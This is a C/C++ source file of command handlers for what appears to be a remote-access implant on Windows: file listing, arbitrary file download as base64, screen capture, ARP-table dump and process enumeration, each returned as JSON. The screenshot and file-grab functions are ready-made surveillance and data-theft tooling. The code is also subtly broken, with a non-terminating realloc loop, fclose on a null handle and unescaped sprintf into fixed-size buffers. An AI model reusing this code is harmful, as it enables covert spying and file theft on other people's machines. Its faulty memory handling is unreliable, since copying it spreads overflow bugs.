#include "command.hpp"

#define MSGBLANK_LEN 16


const char *jsonMsgBlank = "{\"message\": \"%s\"}";
void jsonMsg(char *msg, char *buf, int *len) {
    *len = sprintf(buf, jsonMsgBlank, msg);
}

char *commandEcho(char *args, int argsLen, int *msgLen) {
    char *msg = (char *)malloc(MSGBLANK_LEN + argsLen + 0x10);
    jsonMsg(args, msg, msgLen);
    return msg;
}

const char *noDir = "Error: No such file or directory";
#define NODIR_LEN 32
char *command_ls(char *args, int argsLen, int *msgLen) {
    DIR *dir;
    struct dirent *ent;
    struct stat st;

    char *msg = (char *)malloc(1024);
    *msgLen = 0;

    if ((dir = opendir(args)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            char path[1024];
            snprintf(path, sizeof(path), "%s/%s", args, ent->d_name);
            stat(path, &st);

            char line[1024];
            int len;
            if (S_ISDIR(st.st_mode)) {
                len = snprintf(line, sizeof(line), "%-24s dir     -\n", ent->d_name);
            } else {
                len = snprintf(line, sizeof(line), "%-24s file    %lld\n", ent->d_name, (long long)st.st_size);
            }

            while (*msgLen + len >= 1024) {
                msg = (char *)realloc(msg, *msgLen * 2);
            }
            strcpy(msg + *msgLen, line);
            *msgLen += len;
        }
        closedir(dir);
    } else {
        strcpy(msg, noDir);
        *msgLen = NODIR_LEN;
    }
    char *toRet = (char *)malloc(*msgLen + MSGBLANK_LEN + 0x10);
    sprintf(toRet, jsonMsgBlank, msg);
    *msgLen += MSGBLANK_LEN;
    free(msg);
    return toRet;
}

const char *fileBlank = "{\"file\": {\"name\": \"%s\", \"content\": \"%s\"}}";
char *command_download(char *args, int argsLen, int *msgLen) {
    //printf("try to download\n");
    FILE *file;
    char *buffer;
    long fileSize;
    file = fopen(args, "rb");
    //printf("try to download check point 1\n");
    if(file == NULL) {
        buffer = (char *)malloc(MSGBLANK_LEN + 0x10 + NODIR_LEN);
        *msgLen = sprintf(buffer, jsonMsgBlank, noDir);
        fclose(file);
        return buffer;
    }
    //printf("try to download check point 2\n");
    fseek(file, 0,SEEK_END);
    fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    buffer = (char *)malloc(fileSize);
    //printf("try to download check point 3\n");
    fread(buffer, 1, fileSize, file);
    fclose(file);
    int base64Len;
    //printf("try to download check point 4\n");
    char *base64 = base64_encode((const unsigned char *)buffer, fileSize, &base64Len);
    //printf("try to download check point 5\n");
    
    free(buffer);
    buffer = (char *)malloc(base64Len + argsLen + 0x200);
    //printf("try to download check point 6\n");
    *msgLen = sprintf(buffer, fileBlank, args, base64);
    //printf("try to download check point 7\n");
    free(base64);
    //printf("try to download check point 8\n");
    return buffer;
}

PBYTE CaptureScreen(size_t *len) {
    // 获取屏幕尺寸
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    // 创建设备上下文
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    
    // 创建位图
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    HGDIOBJ hOldBitmap = SelectObject(hMemoryDC, hBitmap);
    
    // 拷贝屏幕到位图
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    
    // 保存位图到文件
    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;  // 垂直翻转
    bi.biPlanes = 1;
    bi.biBitCount = 24;     // 24 位色深
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
    
    // 文件头
    BITMAPFILEHEADER bmfh;
    bmfh.bfType = 0x4D42;  // "BM"
    bmfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + width * height * 3;
    bmfh.bfReserved1 = 0;
    bmfh.bfReserved2 = 0;
    bmfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    int bytesPerLine = ((width * bi.biBitCount + 31) / 32) * 4;
    int imageSize = bytesPerLine * height;
    PBYTE buffer = (PBYTE)malloc(imageSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER));
    memmove(buffer, &bmfh, sizeof(BITMAPFILEHEADER));
    memmove(buffer + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
    GetDIBits(hMemoryDC, hBitmap, 0, height, buffer + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    *len = imageSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    return buffer;
}
char *command_screenshot(char *args, int argsLen, int *msgLen) {
    size_t len;
    int base64Len;
    PBYTE data = CaptureScreen(&len);
    char *base64 = base64_encode(data, len, &base64Len);
    free(data);
    data = (PBYTE)malloc(base64Len + 0x100);
    *msgLen = sprintf((char *)data, fileBlank, "screenshot.bmp", base64);
    free(base64);
    return (char *)data;
}


PBYTE getarp(int *len) {
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;
    MIB_IPNETTABLE *pIpNetTable;

    pIpNetTable = (MIB_IPNETTABLE *)malloc(sizeof(MIB_IPNETTABLE));
    if (pIpNetTable == NULL) {
        printf("Error allocating memory\n");
        return NULL;
    }

    // Make an initial call to GetIpNetTable to get the necessary size into dwSize
    if (GetIpNetTable(pIpNetTable, &dwSize, 0) == ERROR_INSUFFICIENT_BUFFER) {
        free(pIpNetTable);
        pIpNetTable = (MIB_IPNETTABLE *)malloc(dwSize);
        if (pIpNetTable == NULL) {
            printf("Error allocating memory\n");
            return NULL;
        }
    }

    // Make a second call to GetIpNetTable to get the actual data
    if ((dwRetVal = GetIpNetTable(pIpNetTable, &dwSize, 0)) == NO_ERROR) {
        // Calculate total length needed for the string
        DWORD totalLength = 0;
        for (DWORD i = 0; i < pIpNetTable->dwNumEntries; i++) {
            totalLength += snprintf(NULL, 0, "%s   %02X-%02X-%02X-%02X-%02X-%02X   %s   %d\n",
                                   inet_ntoa(*(struct in_addr *)&(pIpNetTable->table[i].dwAddr)),
                                   pIpNetTable->table[i].bPhysAddr[0], pIpNetTable->table[i].bPhysAddr[1], 
                                   pIpNetTable->table[i].bPhysAddr[2], pIpNetTable->table[i].bPhysAddr[3], 
                                   pIpNetTable->table[i].bPhysAddr[4], pIpNetTable->table[i].bPhysAddr[5],
                                   (pIpNetTable->table[i].dwType == MIB_IPNET_TYPE_DYNAMIC) ? "Dynamic" : "Static",
                                   pIpNetTable->table[i].dwIndex);
        }

        // Allocate memory for the string
        PBYTE result = (PBYTE)malloc(totalLength + 1);
        if (result == NULL) {
            printf("Error allocating memory\n");
            free(pIpNetTable);
            return NULL;
        }

        // Fill the string
        PBYTE p = result;
        for (DWORD i = 0; i < pIpNetTable->dwNumEntries; i++) {
            p += snprintf((char *)p, totalLength + 1, "%s   %02X-%02X-%02X-%02X-%02X-%02X   %s   %d\n",
                          inet_ntoa(*(struct in_addr *)&(pIpNetTable->table[i].dwAddr)),
                          pIpNetTable->table[i].bPhysAddr[0], pIpNetTable->table[i].bPhysAddr[1], 
                          pIpNetTable->table[i].bPhysAddr[2], pIpNetTable->table[i].bPhysAddr[3], 
                          pIpNetTable->table[i].bPhysAddr[4], pIpNetTable->table[i].bPhysAddr[5],
                          (pIpNetTable->table[i].dwType == MIB_IPNET_TYPE_DYNAMIC) ? "Dynamic" : "Static",
                          pIpNetTable->table[i].dwIndex);
        }

        *len = totalLength;
        free(pIpNetTable);
        return result;
    }
    else {
        printf("Error: GetIpNetTable failed with error %ld\n", dwRetVal);
        free(pIpNetTable);
        return NULL;
    }
}

char *command_arp(char *args, int argsLen, int *msgLen) {
    int len;
    PBYTE arpData = getarp(&len);
    char *buf = (char *)malloc(len + 0x40);
    *msgLen = sprintf(buf, jsonMsgBlank, arpData);
    free(arpData);
    return buf;
}
char *getProcess(int *len) {
    // 获取系统中所有进程的句柄
    DWORD processes[1024], cbNeeded, cProcesses;
    if (!EnumProcesses(processes, sizeof(processes), &cbNeeded))
    {
        printf("Failed to enumerate processes\n");
        return NULL;
    }

    // 计算实际返回的进程数
    cProcesses = cbNeeded / sizeof(DWORD);

    // 估计字符串长度
    int bufferSize = 1024 * 100; // 初始缓冲区大小
    char *buffer = (char *)malloc(bufferSize * sizeof(char));
    int pos = 0;

    if (buffer == NULL) {
        printf("Memory allocation failed\n");
        return NULL;
    }

    // 将进程信息写入缓冲区
    pos += snprintf(buffer + pos, bufferSize - pos, "PID\t\tName\n");

    // 遍历每个进程，获取进程信息
    for (unsigned int i = 0; i < cProcesses; i++)
    {
        if (processes[i] != 0)
        {
            // 打开进程句柄
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
            if (hProcess != NULL)
            {
                // 获取进程名
                TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
                if (GetModuleBaseName(hProcess, NULL, szProcessName, sizeof(szProcessName) / sizeof(TCHAR)) != 0)
                {
                    pos += snprintf(buffer + pos, bufferSize - pos, "%-8d%s\n", processes[i], szProcessName);
                }
                else
                {
                    pos += snprintf(buffer + pos, bufferSize - pos, "Failed to get process name for PID: %d\n", processes[i]);
                }
                CloseHandle(hProcess);
            }
            else
            {
                pos += snprintf(buffer + pos, bufferSize - pos, "Failed to open process for PID: %d\n", processes[i]);
            }
        }
    }

    *len = pos;
    return buffer;
}
char *command_process(char *args, int argsLen, int *msgLen) {
    int len;
    char *processData = getProcess(&len);
    char *buf = (char *)malloc(len + 0x40);
    *msgLen = sprintf(buf, jsonMsgBlank, processData);
    free(processData);
    return buf;
}
/*
int main() {
    int len;
    char *file = command_download((char *)"./blank.exe", 11, &len);
    printf("%d\n", len);
}*/